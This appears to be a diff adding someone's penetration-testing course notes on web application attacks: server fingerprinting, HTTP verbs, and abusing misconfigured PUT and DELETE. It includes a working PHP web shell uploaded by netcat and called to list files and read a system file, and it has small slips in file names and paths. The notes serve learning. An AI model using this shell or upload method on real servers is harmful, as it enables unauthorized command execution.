@@ -1,0 +1,118 @@
+Penetration Testing 4 - Web Application Attacks
+
+Web Server Fingerprinting
+	Detecting: 
+		Daemon providing the service (E.g. IIS, Apache, nginx)
+		Version
+		OS of the host
+	
+	Netcat (TCP/IP Swiss army knife)
+		Can act as client or server
+		Banner Grabbing (Non-SSL)
+			nc <Target Address> 80
+			HEAD / HTTP/1.0
+			
+		Notes: 
+			Request in Uppercase
+			Connects silently. Just need to write command (-v for verbose)
+		
+			openssl s_client -connect target.site:443
+			HEAD / HTTP/1.0
+			
+			
+	HTTPrint
+		httprint -P0 -h <target hosts> -s <signatue file>
+			-P0 = Don't ping
+			-h = list of hosts
+			-s = signature file to use
+			
+		E.g.
+			httprint -P0 -h 1.2.3.4 -s /usr/share/httprint/signatures.txt
+			
+HTTP VERBS
+	GET
+		Request a resource
+			GET /page.php HTTP/1.1
+			Host: www.example.site
+			
+			GET /page.php?course=PTS HTTP/1.1
+			Host: www.exaple.site			
+	POST
+		Submit HTML form POST Parameters in message body
+			POST /login.php HTTP/1.1
+			Host: www.example.site
+			
+			username=john&password=mypass
+
+	HEAD
+		Similar to GET and is asks for just the headders of the response. 
+			HEAD / HTTP/1.1
+			Host: www.example.site
+			
+	PUT
+		Upload a file to a server. Dangerous if misconfigured. 
+			PUT /path/to/destination HTTP/1.1
+			Host: www.example.site
+			
+			<PUT data>
+			
+	DELETE
+		Delete a file from a server
+			DELETE /path/to/destination HTTP/1.1
+			Host: www.example.site
+		
+	OPTIONS
+		Query the server for enabled HTTP Verbs (If using HTTP/1.0 can skip the Host)
+			OPTIONS / HTTP/1.1
+			Host: www.example.site
+
+
+Exploiting Misconfigured Verbs
+	Becomnig uncommon
+		Common in embedded devices, IP Cameras, and smart devices. 
+		
+	Send OPTIONS message
+		nc victim.site 80
+		OPTIONS / HTTP/1.0
+		
+	Exploiting DELETE
+		nc victim.site 80
+		DELETE /path/to/resource.txt HTTP/1.0
+		
+	Exploiting PUT
+		Need size of the file
+			wc -m payload.php
+		nc victim.site 80
+		PUT /payload.php HTTP/1.0
+		Content-type: text/html
+		Content-length: 20
+		<?php phpinfo(); ?>
+		
+		Uploading a PHP Shell with PUT
+		
+		wc -m shell.php
+			136 shell.php
+		
+		nc victim.site 80
+		PUT /payload.php HTTP/1.0
+		Content-type: text/html
+		Content-length: 136
+		<?php
+		if (isset($_GET['cmd']))
+		{
+			$cmd = $_GET['cmd'];
+			echo '<pre>';
+			$result = shell_exec($cmd);
+			echo $result;
+			echo '</pre>';
+		}
+		?>
+		
+		Called by browsing like the below to execute the ls command: 
+			victim.site/shell.php?cmd=ls
+		Or
+			victim.site/shell.php?cmd=cat /etc/passed
+			
+			
+		
+		
